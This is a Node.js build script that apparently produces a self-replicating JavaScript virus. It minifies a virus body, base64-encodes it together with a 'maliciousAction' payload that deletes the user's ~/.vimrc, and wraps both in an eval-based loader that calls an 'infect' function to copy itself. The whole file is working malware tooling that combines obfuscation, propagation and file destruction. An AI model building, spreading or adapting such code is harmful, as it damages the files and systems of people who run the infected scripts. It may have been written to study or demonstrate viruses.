const fs   = require( "fs-extra" );
const exec = require( "child-process-promise" ).exec;

const maliciousAction = "(() => require('fs').unlink( '~/.vimrc' ))()";

function getCopyOfVirus( virusSrc, action ) {
    const enc = x => Buffer.from( x ).toString( "base64" );
    return `
(function() {
    var virusSrc = "${ enc( virusSrc ) }";
    var action   = "${ enc( action ) }";
    const dec = x => Buffer.from( x, "base64" ).toString();
    eval( dec(action) + dec(virusSrc) + "infect( virusSrc, action );" ); 
})();`;
}


async function build() {

    var src = "body.js";
    var compiled = ".build/body.compiled.js";
    var minified = ".build/body.min.js";
        
    var tgt = "payload.built.js";

    await fs.ensureDir( ".build" );
    await exec( `cat ${src} | ./node_modules/.bin/babel -o ${compiled} --presets es2015` );
    await exec( `./node_modules/.bin/uglifyjs --mangle --compress -o ${minified} ${compiled}` );

    var raw = await fs.readFile( minified, "utf-8" );
    await fs.writeFile( tgt, getCopyOfVirus( raw, maliciousAction ) );
}

build();
